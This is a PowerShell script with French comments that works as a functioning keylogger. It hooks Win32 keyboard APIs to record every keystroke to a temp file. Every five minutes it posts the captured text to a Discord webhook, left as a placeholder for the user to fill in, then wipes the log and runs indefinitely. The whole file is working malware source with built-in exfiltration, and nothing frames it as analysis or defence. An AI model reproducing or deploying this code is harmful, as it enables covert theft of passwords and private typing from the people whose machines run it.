function KeyLog {
    $MAPVK_VK_TO_CHAR = 0x02

    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    $logfile = "$env:temp\key.log"
    $webhookUrl = "REMPLACE_PAR_TON_WEBHOOK"
    $lastSendTime = Get-Date
    $sendInterval = 300  # Envoie sur Discord tous les 5 minutes
    
    Write-Host "KeyLogger demarre en mode INFINI..." -ForegroundColor Green
    Write-Host "Sera envoye sur Discord toutes les 5 minutes" -ForegroundColor Yellow

    while ($true) {
        # Vérifier s'il faut envoyer les logs
        $elapsed = (Get-Date) - $lastSendTime
        if ($elapsed.TotalSeconds -ge $sendInterval) {
            Send-LogsToDiscord -logfile $logfile -webhook $webhookUrl
            $lastSendTime = Get-Date
        }

        for ($i = 0; $i -lt 255; $i++) {
            $state = $getKeyState::GetAsyncKeyState($i)
            if ($state -eq -32767) {
                [byte[]]$keyboardState = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($keyboardState)
                $virtualkeycode = $i
                $scancode = $getKey::MapVirtualKey($virtualkeycode, $MAPVK_VK_TO_CHAR)
                $stringBuilder = New-Object System.Text.StringBuilder
                $unicode = $getUnicode::ToUnicode($virtualkeycode, $scancode, $keyboardState, $stringBuilder, [int]$stringBuilder.Capacity, 0)

                if ($unicode -gt 0) {
                    $mychar = $stringBuilder.ToString()
                    Out-File -FilePath $logfile -Encoding UTF8 -Append -InputObject $mychar
                }
            }
        }
        Start-Sleep -Milliseconds 10
    }
}

# Fonction d'envoi sur Discord
function Send-LogsToDiscord {
    param(
        [string]$logfile,
        [string]$webhook
    )

    if (Test-Path $logfile) {
        try {
            $contenu = Get-Content $logfile -Raw -Encoding UTF8
            
            if ($contenu.Length -gt 1900) {
                $contenu = $contenu.Substring(0, 1900) + "`n... (tronque)"
            }
            
            $json = @{
                content = "📝 **Keylog (mise a jour):** ```$contenu```"
            } | ConvertTo-Json
            
            Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json" -TimeoutSec 10
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Envoye sur Discord ✅" -ForegroundColor Green
            
            # Efface le fichier apres envoi
            Clear-Content -Path $logfile -Force
        } catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Erreur Discord : $_" -ForegroundColor Red
        }
    }
}

# Lancer le keylogger
KeyLog
